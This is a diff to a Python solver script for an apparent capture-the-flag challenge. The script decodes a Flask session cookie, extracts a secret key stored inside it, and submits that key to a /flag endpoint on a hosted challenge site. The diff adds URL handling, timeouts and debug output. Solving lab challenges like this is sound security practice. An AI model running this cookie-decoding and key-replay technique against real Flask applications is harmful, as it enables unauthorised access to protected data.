@@ -8,10 +8,10 @@ import requests
 import base64
 import json
 import sys
-from urllib.parse import urlencode
+from urllib.parse import urlencode, urljoin
 
 # Configuration
-TARGET_URL = "http://127.0.0.1:5000"
+TARGET_URL = "https://flask-session-ctf.vercel.app"
 FLAG_ENDPOINT = "/flag"
 
 def print_banner():
@@ -54,8 +54,8 @@ def decode_flask_cookie(cookie_value):
 def extract_secret_key(decoded_session):
     """
     Extract secret key from decoded session
-    The key is stored in session['sk'] and is in bytes format
-    Flask stores it as {' b': 'base64_string'} in the session
+    The key is stored in session['sk'] and can be in bytes or string format
+    Flask stores bytes as {' b': 'base64_string'} in the session
     """
     try:
         if 'sk' not in decoded_session:
@@ -63,6 +63,8 @@ def extract_secret_key(decoded_session):
             return None
         
         sk_data = decoded_session['sk']
+        print(f"[DEBUG] sk_data type: {type(sk_data)}")
+        print(f"[DEBUG] sk_data value: {sk_data}")
         
         # Flask stores bytes as {' b': 'base64_string'} (note the space before 'b')
         if isinstance(sk_data, dict):
@@ -74,13 +76,20 @@ def extract_secret_key(decoded_session):
                     # The value is already base64-encoded by Flask
                     return base64_value
         
-        # If it's already a string, return it
+        # If it's a string, we need to encode it to bytes then base64 encode
         if isinstance(sk_data, str):
-            return sk_data
+            print(f"[+] Secret key is a string, encoding to base64...")
+            # Convert string to bytes, then base64 encode
+            secret_bytes = sk_data.encode('utf-8')
+            base64_value = base64.b64encode(secret_bytes).decode('utf-8')
+            print(f"[+] Base64 encoded: {base64_value[:50]}...")
+            return base64_value
         
         # If it's bytes, encode it to base64
         if isinstance(sk_data, bytes):
-            return base64.b64encode(sk_data).decode('utf-8')
+            base64_value = base64.b64encode(sk_data).decode('utf-8')
+            print(f"[+] Base64 encoded bytes: {base64_value[:50]}...")
+            return base64_value
         
         print(f"[-] Unexpected sk_data format: {type(sk_data)}")
         print(f"[-] sk_data content: {sk_data}")
@@ -88,6 +97,8 @@ def extract_secret_key(decoded_session):
         
     except Exception as e:
         print(f"[-] Error extracting secret key: {e}")
+        import traceback
+        traceback.print_exc()
         return None
 
 def solve_challenge():
@@ -99,20 +110,31 @@ def solve_challenge():
     # Create a session to persist cookies
     session = requests.Session()
     
+    # Build URL properly
+    flag_url = urljoin(TARGET_URL, FLAG_ENDPOINT)
+    
     # Step 1: Visit /flag endpoint to get session cookie
-    print("[*] Step 1: Visiting /flag endpoint to get session cookie...")
+    print(f"[*] Step 1: Visiting /flag endpoint to get session cookie...")
+    print(f"[*] Target: {flag_url}")
     try:
-        response = session.get(f"{TARGET_URL}{FLAG_ENDPOINT}")
+        response = session.get(flag_url, timeout=10)
+        print(f"[+] Status code: {response.status_code}")
+        
         if response.status_code != 200:
-            print(f"[-] Failed to access {TARGET_URL}{FLAG_ENDPOINT}")
-            print(f"[-] Status code: {response.status_code}")
+            print(f"[-] Failed to access {flag_url}")
+            print(f"[-] Response: {response.text[:200]}")
             return False
     except requests.exceptions.ConnectionError:
         print(f"[-] Cannot connect to {TARGET_URL}")
         print("[-] Make sure the Flask server is running!")
         return False
+    except requests.exceptions.Timeout:
+        print(f"[-] Connection timeout to {TARGET_URL}")
+        return False
     except Exception as e:
         print(f"[-] Error: {e}")
+        import traceback
+        traceback.print_exc()
         return False
     
     # Step 2: Extract session cookie
@@ -148,20 +170,21 @@ def solve_challenge():
     # Step 5: Submit secret key to get flag
     print("[*] Step 5: Submitting secret key to get flag...")
     
-    # URL encode the secret key (important for special characters like +, /, =)
-    from urllib.parse import quote
-    secret_key_encoded = quote(secret_key_b64, safe='')
+    # Build request URL with secret key parameter
+    # Use params to let requests handle URL encoding properly
+    flag_url_with_sk = urljoin(TARGET_URL, FLAG_ENDPOINT)
+    params = {'sk': secret_key_b64}
     
-    flag_url = f"{TARGET_URL}{FLAG_ENDPOINT}?sk={secret_key_encoded}"
-    
-    print(f"[+] Secret key (URL-encoded): {secret_key_encoded[:50]}...")
-    print(f"[+] Request URL: {flag_url[:80]}...")
+    print(f"[*] Requesting: {flag_url_with_sk}?sk={secret_key_b64[:30]}...")
     
     try:
-        flag_response = session.get(flag_url)
+        flag_response = session.get(flag_url_with_sk, params=params, timeout=10)
+        
+        print(f"[+] Response status: {flag_response.status_code}")
         
         if flag_response.status_code != 200:
             print(f"[-] Failed to get flag. Status code: {flag_response.status_code}")
+            print(f"[-] Response: {flag_response.text[:300]}")
             return False
         
         # Check if flag is in response
@@ -183,11 +206,19 @@ def solve_challenge():
             return True
         else:
             print("[-] Wrong secret key or unexpected response")
-            print(f"[-] Response preview: {flag_response.text[:200]}")
+            print(f"[-] Response preview: {flag_response.text[:500]}")
+            
+            # Additional debugging
+            if "Access Denied" in flag_response.text:
+                print("[!] Server rejected the secret key")
+                print(f"[!] Submitted secret key: {secret_key_b64}")
+            
             return False
             
     except Exception as e:
         print(f"[-] Error submitting secret key: {e}")
+        import traceback
+        traceback.print_exc()
         return False
 
 def main():
